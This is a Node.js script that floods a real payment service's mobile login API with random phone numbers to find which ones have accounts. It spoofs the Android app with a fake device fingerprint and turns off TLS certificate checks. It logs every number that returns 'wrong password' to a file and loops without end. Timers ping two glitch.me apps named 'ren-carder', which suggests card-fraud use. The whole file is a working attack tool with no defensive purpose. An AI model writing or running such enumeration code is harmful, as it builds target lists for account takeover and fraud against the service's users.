
const fetch = require('node-fetch');
const fs = require('fs');
var readline = require('readline');
const https = require("https");
const agent = new https.Agent({
  rejectUnauthorized: false,
});
var status;
function fish(){
var id = "011"+gennum(7);
fetch('https://istinara.net:4433/ISTINARA-CONSUMER-GATEWAY/ICGService/istinaraNewLogin', {
    method: 'POST',
    headers: {
        'Host': 'istinara.net:4433',
        'Content-Type': 'application/json; charset=utf-8',
        'Content-Length': '2424',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/3.9.0',
        'Connection': 'close'
    },
    agent,
    body: JSON.stringify({
        'Password': '',
        'email': '',
        'firstName': '',
        'hash': 'AQAAAAAAAAAAAAAAAAAAAAATberbSFNDlYhRNg8nQBRnTb0n3TRguMUOV5hL3e1fPNacCAHg+4XC05kpCclPCyFSguTB4KNkmmsrmdqE7zVS7X9X6izFUhLSMZfoZzsdYRckLve49zd+xA1D+rGJn9bxkDuifXFJptMmegVbaWzzZbA96D7LfzY5DkMGMu3g+9p2x4sIks47L4mkM8NnH/W3PWJoElcut8qk6xNMr50JoUBBno7dQ56whJmDCEatVQcbpTH2RmmR25HEUdk7NqRb0Bk49ky0JzCwn9yM8+M2mtu86Hpnt/7bP7CRHN9iHe3fj0WKRQgFcrKecxaeyBJtC9oPDACpz3NP43URBguH',
        'istAPKVersion': '3332',
        'istApplicationId': 'istICM-400',
        'istDeviceId': '{"AndroidSdkReleaseDate":"Tue Oct 04 14:14:53 CDT 2016","ApiLevel":"25","AvailableExternalStorageSize":"11903594496","AvailableInternalMemorySize":"11903594496","AvailableRam":"3555356672","BatteryCapacity":"1000.0","BatteryHealth":"2","BatteryPercentage":"100","BatteryTechnology":"Li-poly","BatteryTemperature":"27.0","BatteryVoltage":"4200","BoardName":"universal9825","Bootloader":"uboot","BrandName":"samsung","BuildFingerPrint":"samsung/samsung/SM-N975F:7.1.2/20171130.376229:user/release-keys","BuildTime":"1597817161000","Country":"","CurrentLatitude":"0.0","CurrentLongitude":"0.0","DeviceId":"868c1001eca20dd6","DeviceType":"GSM","DisplayCountry":"","DisplayLanguage":"\xD8\xA7\xD9\x84\xD8\xB9\xD8\xB1\xD8\xA8\xD9\x8A\xD8\xA9","DisplayName":"\xD8\xA7\xD9\x84\xD8\xB9\xD8\xB1\xD8\xA8\xD9\x8A\xD8\xA9","DisplayVersion":"samsung-user 7.1.2 20171130.276299 release-keys","GPUExtensions":"null","GPURenderer":"null","GPUVendor":"null","GPUVersion":"null","HardwareName":"samsungexynos9825","Host":"se.infra","IpAddress":"10.0.2.15","Iso3Country":"","Iso3Language":"ara","KernalVersion":"Linux localhost 4.14.253-android+ #754 SMP Wed Nov 9 17:04:03 CST 2022 x86_64","Language":"ar","LanguageTag":"ar","Location":"null","ManafacturerName":"samsung","ModelName":"SM-N975F","NumberOfCores":"4","NumberOfSimSlot":"1","ProductName":"SM-N975F","SecurityPathDate":"2017-10-05","Serial":"81207584","Servers":"[192.168.43.1]","TotalExternalStorageSize":"13369761792","TotalInternalMemorySize":"13369761792","TotalRam":"4141568000","UsedExternalStorageSize":"1466167296","UsedInternalMemorySize":"1466167296","UsedRam":"586211328","VersionName":"Nougat","isRooted":"false","isUsbHostSupported":"true","mediaDRM":""}',
        'language': 'ar',
        'lastName': '',
        'phoneNumber': id,
        'tranDateTime': '111222021453'
    })
}).then((response)=>{
  
  status = response.status;
  return response.json() }).then((data)=>{
var code = data.responseCode;
  if(code == 3){
fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;
console.log(id + " Success");
  fish()
});
    
  }else{
//console.log(code);
   fish()
  }

  //3 wrong pass
  //2 = dont exist
  //5 = locked
  
}).catch((err)=>{
  fish()
})
}


fish()



// functs
function gennum(length) {
    var result           = '';
    var characters       = '0123456789';
    //ABCDEFGHIJKLMNOPQRSTUVWXYZ
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

setInterval(()=>{
fetch("https://ren-carder.glitch.me/")
  fetch("https://ren-carder2.glitch.me/")
},240000)